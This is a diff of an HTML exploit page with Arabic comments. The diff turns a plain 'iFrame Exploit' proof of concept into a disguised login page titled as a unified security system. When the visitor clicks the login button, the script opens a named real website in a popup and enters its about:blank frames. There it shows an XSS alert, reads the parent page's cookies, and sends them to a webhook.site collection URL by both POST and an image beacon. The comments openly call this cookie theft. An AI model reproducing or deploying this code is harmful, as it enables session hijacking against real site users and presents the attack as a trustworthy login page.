@@ -1,61 +1,180 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>PoC - iFrame Exploit</title>
+    <meta charset="UTF-8">
+    <title>نظام الأمان الموحد</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #667eea;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+        }
+        h1 { color: #333; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 30px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            text-align: left;
+            direction: ltr;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h2>جاري الاختبار...</h2>
-    <button onclick="startAttack()">بدء الاستغلال</button>
-    
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h1>نظام الأمان الموحد</h1>
+        <p>الرجاء تسجيل الدخول للمتابعة</p>
+        
+        <input type="email" placeholder="البريد الإلكتروني">
+        <input type="password" placeholder="كلمة المرور">
+        
+        <button onclick="startAttack()">تسجيل الدخول</button>
+        
+        <div id="status"></div>
+    </div>
+
     <script>
-        const TARGET = 'https://www.powerpak.com/';
-        const EXFIL_SERVER = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f/log'; // استبدل بخادمك
+        // ⚙️ إعداداتك - عدل هذا فقط
+        const TARGET_URL = 'https://www.powerpak.com/';
+        const WEBHOOK_URL = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f'; // 🔄 استبدل بالرابط الخاص بك
         
-        function startAttack() {
-            // فتح الموقع المستهدف
-            const win = window.open(TARGET, 'target', 'width=1000,height=800');
-            
-            setTimeout(() => {
-                exploitFrames(win);
-            }, 3000);
+        const statusDiv = document.getElementById('status');
+
+        function log(msg) {
+            console.log(msg);
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML += '> ' + msg + '<br>';
         }
-        
-        function exploitFrames(targetWindow) {
+
+        async function startAttack() {
+            log('🚀 Opening target...');
+            
+            const targetWin = window.open(TARGET_URL, 'target', 'width=1000,height=800');
+            
+            if (!targetWin) {
+                alert('الرجاء السماح بفتح النوافذ المنبثقة');
+                return;
+            }
+            
+            await new Promise(r => setTimeout(r, 4000));
+            
             try {
-                // المرور على جميع الفريمات
-                for (let i = 0; i < targetWindow.frames.length; i++) {
+                exploitFrames(targetWin);
+            } catch(e) {
+                log('❌ Error: ' + e.message);
+            }
+        }
+
+        function exploitFrames(targetWindow) {
+            let exploited = 0;
+            
+            log('🔍 Scanning ' + targetWindow.frames.length + ' frames...');
+            
+            for (let i = 0; i < targetWindow.frames.length; i++) {
+                try {
                     const frame = targetWindow.frames[i];
                     
-                    // التحقق من أن الفريم about:blank
                     if (frame.location.href === 'about:blank') {
                         
-                        // 🚨 1. عمل Alert لإثبات XSS
-                        frame.alert('XSS Confirmed! Domain: ' + frame.document.domain);
+                        // 🚨 1. Alert - إثبات XSS
+                        frame.alert(
+                            '🚨 XSS CONFIRMED!\n\n' +
+                            'Domain: ' + frame.document.domain + '\n' +
+                            'Frame #' + i + ' is vulnerable!'
+                        );
                         
-                        // 🚨 2. سرقة Cookies وإرسالها للخادم الخارجي
-                        const stolenCookies = frame.parent.document.cookie;
+                        // 🚨 2. سرقة Cookies
+                        const cookies = frame.parent.document.cookie;
                         
-                        // طريقة 1: إرسال via GET (صورة)
-                        new Image().src = EXFIL_SERVER + '?cookies=' + encodeURIComponent(stolenCookies) + '&t=' + Date.now();
+                        log('🍪 Frame ' + i + ': ' + cookies.length + ' chars stolen');
                         
-                        // طريقة 2: إرسال via POST (Fetch)
-                        fetch(EXFIL_SERVER, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                cookies: stolenCookies,
-                                url: frame.parent.location.href,
-                                time: new Date().toISOString()
-                            })
+                        // 📤 إرسال لـ Webhook.site
+                        sendToWebhook({
+                            frame: i,
+                            domain: frame.document.domain,
+                            cookies: cookies,
+                            url: frame.parent.location.href,
+                            time: new Date().toISOString()
                         });
                         
-                        console.log('✅ Frame', i, 'exploited!');
-                        console.log('🍪 Cookies:', stolenCookies);
+                        exploited++;
                     }
+                } catch(e) {
+                    log('❌ Frame ' + i + ': Protected');
                 }
-            } catch(e) {
-                console.error('Error:', e.message);
             }
+            
+            log('✅ Exploited: ' + exploited + ' frames');
+            
+            if (exploited === 0) {
+                log('⚠️ No exploitable frames found');
+            }
+        }
+
+        function sendToWebhook(data) {
+            // طريقة 1: POST (Fetch)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => log('📤 POST sent'));
+            
+            // طريقة 2: GET (Image) - احتياطي
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?frame=' + data.frame + 
+                     '&cookies=' + encodeURIComponent(data.cookies.substring(0, 500)) +
+                     '&t=' + Date.now();
+            
+            log('📤 GET backup sent');
         }
     </script>
 </body>
